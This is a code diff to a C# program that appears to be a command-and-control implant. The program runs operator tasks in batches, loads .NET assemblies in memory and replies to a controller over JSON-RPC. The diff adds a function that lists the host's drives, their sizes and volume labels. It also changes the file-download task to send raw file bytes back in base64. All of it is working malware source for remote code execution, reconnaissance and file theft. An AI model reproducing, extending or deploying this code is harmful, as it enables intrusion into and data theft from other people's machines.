@@ -17,6 +17,23 @@ namespace Dots
         private static HttpClient client = new HttpClient();
         private static string key = "";
         private static string check_in_job_id = "";
+
+        public static string Drives()
+        {
+            string result = "";
+            foreach (DriveInfo objDrive in DriveInfo.GetDrives())
+            {
+                result += @"Drive Name : " + objDrive.Name + "\n" +
+                          "Drive Type : " + objDrive.DriveType.ToString() + "\n" +
+                          "Available Free Space : " + Math.Round(objDrive.AvailableFreeSpace / 1000000.0, 3) + " MB" + "\n" +
+                          "Drive Format : " + objDrive.DriveFormat + "\n" +
+                          "Total Free Space : " + Math.Round(objDrive.TotalFreeSpace / 1000000.0, 3) + " MB" + "\n" +
+                          "Total Size : " + Math.Round(objDrive.TotalSize / 1000000.0, 3) + " MB" + "\n" +
+                          "Volume Label : " + objDrive.VolumeLabel + "\n" +
+                          "------------------------------------------------------------\n";
+            }
+            return result;
+        }
         private static (int, string) ExecuteAssembely(byte[] assembly_bytes, string[] arguments, string method_name = "Main", Func<object, task> callback = null)
         {
             Assembly assembly;
@@ -193,10 +210,10 @@ namespace Dots
                     batch_response = "[";
                     foreach (var task in batch_request)
                     {
-
                         string name = task.name;
                         string[] batch_result = { };
                         string result = "";
+                        byte[] byte_result = new byte[] { }; 
                         string task_id = task.id;
                         for (var i = 0; i < task.parameters.Count(); i++)
                         {
@@ -213,7 +230,7 @@ namespace Dots
                             {
                                 string download_path = task.parameters[0];
                                 byte[] filecontent = File.ReadAllBytes(download_path);
-                                result = Convert.ToBase64String(filecontent);
+                                byte_result = filecontent;
                             }
                             if (name == "execute_assembly")
                             {
@@ -276,6 +293,8 @@ namespace Dots
                             }
                             if (result.Length > 1)
                                 batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"" + Base64Encode(result) + "\",\"id\":\"" + task_id + "\"},";
+                            if (byte_result.Length > 1)
+                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"" + Convert.ToBase64String(byte_result) + "\",\"id\":\"" + task_id + "\"},";
                         }
                         catch (Exception ex)
                         {
